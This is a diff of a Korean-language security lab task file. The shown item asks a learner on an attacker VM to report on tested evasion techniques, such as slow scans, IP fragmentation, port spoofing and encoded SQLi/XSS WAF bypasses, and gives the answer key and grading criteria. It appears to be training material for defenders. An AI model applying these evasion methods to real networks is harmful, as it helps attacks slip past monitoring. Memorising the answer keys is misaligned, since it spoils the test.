+      negative_signs:
+      - 안티 핑거프린트 옵션 없음
+      - 기본 nmap만
+      - 시그니처 맥락 없음
   target_vm: attacker
 - order: 15
-  instruction: 은닉 기법 실습 결과를 /tmp/evasion_report.txt에 정리하라. 테스트한 은닉 기법, 성공 여부, 보안 장비
-    강화 방안을 포함하라.
+  instruction: 은닉 기법 실습 결과를 /tmp/evasion_report.txt에 정리하라. 테스트한 은닉 기법, 성공 여부, 보안 장비 강화 방안을 포함하라.
   hint: 각 은닉 기법의 효과와 한계를 분석한다
   category: analysis
   points: 15
-  answer: 'echo -e ''=== Evasion Techniques Report ===\n\n[Tested Techniques]\n1.
-    Slow scan (T1 timing) - Avoid time-based detection\n2. IP fragmentation - Break
-    signature matching\n3. Source port spoofing - Bypass firewall rules\n4. SQLi encoding
-    variations - WAF bypass\n5. XSS alternative payloads - WAF bypass\n6. User-Agent
-    spoofing - Tool detection bypass\n7. Random timing - Break correlation\n8. Data
-    length padding - Signature evasion\n\n[Effectiveness]\n- Most effective: encoding
-    + timing combination\n- Least effective: simple case mixing (modern WAFs handle)\n\n[Security
-    Hardening]\n1. Suricata: enable protocol analysis (not just signatures)\n2. WAF:
-    behavioral analysis + ML-based detection\n3. Firewall: deep packet inspection
-    (DPI)\n4. SIEM: multi-source correlation\n5. Regular signature updates'' > /tmp/evasion_report.txt
-    && cat /tmp/evasion_report.txt'
-  answer_detail: 은닉 기법 보고서는 테스트 결과와 보안 강화 권고를 모두 포함해야 한다. 시그니처 기반 탐지의 한계를 인지하고, 행위
-    기반 탐지, ML 기반 분석, 다중 소스 상관 분석 등 보완 조치를 제시한다.
+  answer: 'echo -e ''=== Evasion Techniques Report ===\n\n[Tested Techniques]\n1. Slow scan (T1 timing)
+    - Avoid time-based detection\n2. IP fragmentation - Break signature matching\n3. Source port spoofing
+    - Bypass firewall rules\n4. SQLi encoding variations - WAF bypass\n5. XSS alternative payloads - WAF
+    bypass\n6. User-Agent spoofing - Tool detection bypass\n7. Random timing - Break correlation\n8. Data
+    length padding - Signature evasion\n\n[Effectiveness]\n- Most effective: encoding + timing combination\n-
+    Least effective: simple case mixing (modern WAFs handle)\n\n[Security Hardening]\n1. Suricata: enable
+    protocol analysis (not just signatures)\n2. WAF: behavioral analysis + ML-based detection\n3. Firewall:
+    deep packet inspection (DPI)\n4. SIEM: multi-source correlation\n5. Regular signature updates'' >
+    /tmp/evasion_report.txt && cat /tmp/evasion_report.txt'
+  answer_detail: 은닉 기법 보고서는 테스트 결과와 보안 강화 권고를 모두 포함해야 한다. 시그니처 기반 탐지의 한계를 인지하고, 행위 기반 탐지, ML 기반 분석, 다중
+    소스 상관 분석 등 보완 조치를 제시한다.
   verify:
     type: output_contains
     expect: Evasion Techniques Report
     field: stdout
+    semantic:
+      intent: '은닉 기법 보고서 — echo > /tmp/evasion_report.txt: [Techniques] 슬로우 스캔/IP 분할/소스 포트/SQLi·XSS 인코딩/UA
+        위장/랜덤 타이밍/데이터 패딩 8종 + [Effectiveness] 인코딩+타이밍 최고/케이스 혼합 무효 + [Hardening] Suricata 프로토콜 분석+WAF
+        ML 기반+DPI+SIEM+시그니처 업데이트.'
+      success_criteria:
+      - Evasion Techniques Report 키워드
+      - Tested + Effectiveness + Hardening 3섹션
+      - 기법 5개 이상 비교
+      acceptable_methods:
+      - echo > 보고서
+      - PTES Vulnerability Analysis
+      - OWASP WAF bypass matrix
+      negative_signs:
+      - 3섹션 중 1개 이하
+      - 기법 3개 이하
+      - 강화 방안 없음
   target_vm: attacker
